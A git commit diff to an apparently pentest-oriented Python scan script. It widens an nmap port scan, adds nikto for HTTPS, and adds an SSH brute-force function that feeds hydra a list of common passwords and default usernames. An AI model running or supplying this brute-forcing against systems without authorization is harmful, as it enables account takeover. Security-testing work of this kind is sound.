648d141ad0fbf89f2599c6089956deb8610de5c4
root <root@kali>
2016-01-27 14:13:11 +0100

    fixed regex, added experimental ssh-brute

--- python/scan.py
+++ python/scan.py
@@ -79,7 +79,7 @@ def portscan(ip):
     
     
     print "[START] nmap tcp-portscan against %s" % ip
-    NMAP = "nmap -sS -PN -A -p80,22 -T4 %s" % ip
+    NMAP = "nmap -sS -PN -A -p- -T4 %s" % ip
     try:
         results = subprocess.check_output(NMAP, shell=True)
         resultArr = results.split("\n")
@@ -123,11 +123,37 @@ def nikto(ip,port):
         print "[ERROR] Exception in nikto scan against %s:%s" % (ip,sys.exc_info()) 
     
     print "[ END ] nikto scan against %s" % ip
+    
+def ssh(ip,port):
+    print "[START] ssh brute against %s on port %s" % (ip,port)
+    userlist=["root", "test", "admin", "user", "postgres", "mysql", "backup", "guest", "web", "tomcat", "www-data", "user1", "test1", "test2"]
+    passwordlist=["1234567890\n", "123456789\n", "12345678\n", "1234567\n", "123456\n", "12345\n", "1234\n", "654321\n", "4321\n", "123123\n", "password\n", "password1\n", "iloveyou\n", "princess\n", "abc123\n", "babygirl\n", "dragon\n", "tequiero\n", "qwerty\n", "qwertz\n", "000000\n", "111111\n", "222222\n", "333333\n", "444444\n", "555555\n", "666666\n", "777777\n", "888888\n", "999999\n", "iloveu\n", "Password123\n", "password123\n", "admin123\n", "Admin123\n", "1337\n", "admin\n", "Admin\n", "root\n", "toor\n", "fuckyou\n", "test\n", "test123\n", "Test\n", "Test123\n", "Administrator\n", "Administrator123\n", "administrator\n", "administrator123\n", "1q2w3e4r\n", "1qaz2wsx\n", "qazwsx\n", "123qwe\n", "123qaz\n", "0000\n", "oracle\n", "123456qwerty\n", "1q2w3e\n", "q1w2e3r4\n", "user\n", "mysql\n", "apache\n", "pass\n", "pass123\n", "Password\n"]
+    tmpfile = open('pws-'+ip+'.txt', 'w')
+    tmpfile.writelines(passwordlist)
+    tmpfile.close()
+    
+    for user in userlist:
+        HYDRA = "hydra -t 4 -l "+user+" -P "+'pws-'+ip+'.txt'+" -f -o "+logdir+'/'+ip+'/'+ip+'-'+port+".sshhydra "+ip+" -s "+port+" ssh > /dev/null 2> /dev/null"
+        try:
+            results = subprocess.check_output(HYDRA, shell=True)
+        except:
+            print "[ERROR]: No valid ssh credentials found"
+    
+    os.remove('pws-'+ip+'.txt')
+    print "[ END ] ssh brute against %s on port %s" % (ip,port)
+    
+    
 def checkServices(ip):
     print "[START] checkServices for ip %s" % ip
     for s in range(len(db[ip][1])):
             if db[ip][1][s] == "http":
                 nikto(ip, db[ip][0][s])
+            elif (db[ip][1][s] == "ssl/http") or ("https" in db[ip][1][s]):
+                nikto(ip, db[ip][0][s])
+            #elif db[ip][1][s] == "ssh":
+            #    ssh(ip,db[ip][0][s])
+                    
+
     print "[ END ] checkServices for ip %s"  % ip
     
 
